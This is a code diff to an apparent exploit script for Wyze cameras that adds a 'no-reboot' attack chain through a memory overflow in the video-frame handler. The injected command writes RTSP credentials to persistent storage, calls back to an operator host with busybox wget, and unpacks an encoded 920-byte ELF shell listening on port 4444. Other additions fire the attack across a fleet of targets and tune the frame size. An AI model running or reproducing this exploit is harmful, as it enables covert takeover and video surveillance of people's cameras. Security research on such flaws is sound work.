@@ -63,6 +63,53 @@ def build_command(user: str, realm: str, pwd: str) -> str:
     return f"echo {cfg} >/configs/rtsp_config.json && reboot"
 
 
+# --- Cycle 5: no-reboot, durable-first chain (FINISH-WYZE.md) -----------------
+#
+# The camera's overflow budget is 5-8 frames per boot (wyze-lan-rce.md) and any
+# reboot-class command wastes the whole budget: after `reboot` the supervisor
+# never brings TUTK 32761 back (bead fss-wyze-cve-2026-38698, 02:43 note) until
+# a power cycle. So ONE frame must do everything durable, in this order:
+#   1. RTSP config write  — /configs/ is a persistent mounted partition; the
+#      write survives reboot and is picked up by wyze_rtsp_sdk_init_v2 at any
+#      later boot. Durable without any daemon restart.
+#   2. beacon + in-memory shell spawner — /tmp is tmpfs (RAM): the 920-byte ELF
+#      payload decoded from the inline gzip lands in /tmp/x and listens on 4444
+#      until the NEXT reboot. Durable for this boot only, by design: nothing is
+#      written to flash, so the chain is fully reversible by rebooting.
+# No `reboot` anywhere. RTSP itself needs no daemon restart: rtsp-enable.md
+# proved 554 can bind without the SDK encoder path when the config exists.
+SHELL_ONE_LINER = (
+    "echo H4sIAAAAAAAC/41TMUvDQBh9uSZtRMG2OIg4BEyhOiQOTlLxOigWVAoKLi4p1lqQWpsruLWDg7P/wKGTuPcXOPcf6Ojg0EVwq98llzaWCj54d/m+792Xu8tLZ+9wX9M0RGAwIaMhOLZo7jIglUZzCxZ05JFCEgmg2adanzSSy/QsqRPNsE1zQMOAaoOpuuTkbTzgOyUkDZlKh/Ugl+EByxRLJlU9hMVo2wamIBKJ6RSsRx47n24zGDZ1s8/SzF6gXK7LaRdzhdXseo7OT7V8L3Nuki7f02G9mMScBZbLW1qa1pWidZTTqddxLKZT2AdR/MApZwW5t8VIQ/ueilks5tAL75l7m8MoDDM9mpOFpeyr/Ryrf6j694x6h873pJ4l3Eq94fpXcG+BW4R3KvGp7laiXDw92JHCbdenEXqW4y8UF2moNdrQUvJrGnD8K1+0hFeBc1QqnzhepX557dV8OK1qrd64vIEjqncCzoUnPDi01PGEaNUrbVH18W/MEzfIV2zsu9BTEUwVr4Q+CXSh/37rdBWvKR8mldeHwTxBZLN1pUuou5O+LM/QucSv0egmym+ymFVjno96jf8A0u3O0P0AQ+VsJZgDAAA=|/bin/base64 -d|/bin/gunzip>/tmp/x;/bin/chmod +x /tmp/x;/tmp/x&"
+)
+BEACON_HOST = "192.168.4.160"  # this Mac on the cam VLAN; :8080 http.server logs the hit
+
+
+def build_command_noreboot(user: str, realm: str, pwd: str,
+                           with_shell: bool = True) -> str:
+    """Durable-first, NO reboot. 554 verification happens from the operator side."""
+    ha1 = hashlib.md5(f"{user}:{realm}:{pwd}".encode()).hexdigest()
+    cfg = f'{{"username":"{user}","ha1":"{ha1}","mode":1}}'
+    parts = [
+        # (a) durable: config on the /configs partition, survives any later reboot
+        f"echo {cfg} >/configs/rtsp_config.json",
+        # beacon: observable proof of execution from the operator side (GET in the
+        # :8080 access log) — uid also answers the spawned-uid question (wyze-lan-rce.md)
+        f"/bin/busybox wget -q -O /dev/null "
+        f"\"http://{BEACON_HOST}:8080/fss-ran?uid=$(/bin/busybox id -u 2>/dev/null)&via=cve38698\""
+        " 2>/dev/null",
+    ]
+    if with_shell:
+        # (b) in-memory: 920-byte ELF (deliverables/payloads/wyze-shsrv.S) on 4444,
+        # tmpfs only — gone at next boot, nothing flashed.
+        parts.append(SHELL_ONE_LINER)
+    return " && ".join(parts) + ";/bin/true"
+
+
+def rtsp_cmd_len(user: str, realm: str, pwd: str, with_shell: bool = True) -> int:
+    return len(build_command_noreboot(user, realm, pwd, with_shell))
+
+
+
 def build_frame(cmd: bytes, ra: int, ra_off: int, cmd_off: int,
                 declared: int, channel: int, frame_no: int) -> bytes:
     """Record exactly as `_doAVTransNew` reads it (wyze_av_inject.py layout)."""
@@ -293,10 +340,23 @@ def fire(ip: str, uid: str, enr: str, mac: str, a: argparse.Namespace,
     send_frame(cam, frame)
     print(f"{ip}: frame sent {len(frame)}B ra={a.ra:#x} ra_off={a.ra_off} "
           f"cmd_off={a.cmd_off} declared={a.declared}")
-    up = poll_554(ip, a.poll_secs)
-    print(f"{ip}: 554 listening: {up}")
-    if not up:
-        return False, None
+    if a.no_reboot:
+        # no reboot happens: exec_shell_sync runs the chain synchronously; RTSP
+        # binds from the config write within seconds, so poll a short window and
+        # keep the session ALIVE (the frame budget is per-boot — do not waste it).
+        up = poll_554(ip, min(a.poll_secs, 30))
+        print(f"{ip}: 554 listening (no-reboot): {up}")
+        if not up:
+            # config write may still have landed; verify config presence via a
+            # second hijack only if the budget allows — record, don't retry blind.
+            print(f"{ip}: 554 not up in {min(a.poll_secs, 30)}s — check the beacon "
+                  f"on :8080 (/fss-ran) before spending another frame")
+            return False, None
+    else:
+        up = poll_554(ip, a.poll_secs)
+        print(f"{ip}: 554 listening: {up}")
+        if not up:
+            return False, None
     status, transcript = digest_describe(ip, a.user, a.pwd, a.realm)
     print(f"{ip}: DESCRIBE -> {status}")
     print(transcript)
@@ -345,17 +405,33 @@ def main() -> int:
     ap.add_argument("--ra-off", type=int, default=RA_OFF)
     ap.add_argument("--cmd-off", type=int, default=CMD_OFF)
     ap.add_argument("--declared", type=int, default=520,
-                    help="packet-1 declared size; >= cmd_off+len(cmd)+1")
+                    help="packet-1 declared size; >= cmd_off+len(cmd)+1 "
+                         "(the Cycle-5 --no-reboot chain needs ~1430)")
     ap.add_argument("--channel", type=lambda s: int(s, 0), default=7)
     ap.add_argument("--poll-secs", type=int, default=120)
     ap.add_argument("--dry", action="store_true",
                     help="mock RTSP server instead of the camera frame")
+    ap.add_argument("--no-reboot", action="store_true",
+                    help="Cycle-5 chain: durable RTSP config + beacon + tmpfs shell, "
+                         "NO reboot; 554 verified from the operator side in-session")
+    ap.add_argument("--no-shell", action="store_true",
+                    help="with --no-reboot: skip the 920-byte tmpfs shell (config+beacon only)")
     ap.add_argument("--loop-watch", action="store_true",
                     help="watch the whole fleet and fire on first ICMP answer")
     ap.add_argument("--targets", nargs="*", help="override the fleet list")
     a = ap.parse_args()
 
-    cmd = build_command(a.user, a.realm, a.pwd).encode()
+    if a.no_reboot:
+        cmd = build_command_noreboot(a.user, a.realm, a.pwd,
+                                     with_shell=not a.no_shell).encode()
+        # the durable chain (~930B) exceeds the 520 default; 1424 is the proven
+        # live size (CobaltOtter: declared 1424 accepted on .26)
+        need = 337 + len(cmd) + 1
+        if a.declared < need:
+            print(f"declared {a.declared} < required {need} — raising to {need}")
+            a.declared = need
+    else:
+        cmd = build_command(a.user, a.realm, a.pwd).encode()
     print(f"cmd ({len(cmd)}B): {cmd.decode()}")
 
     if a.loop_watch:
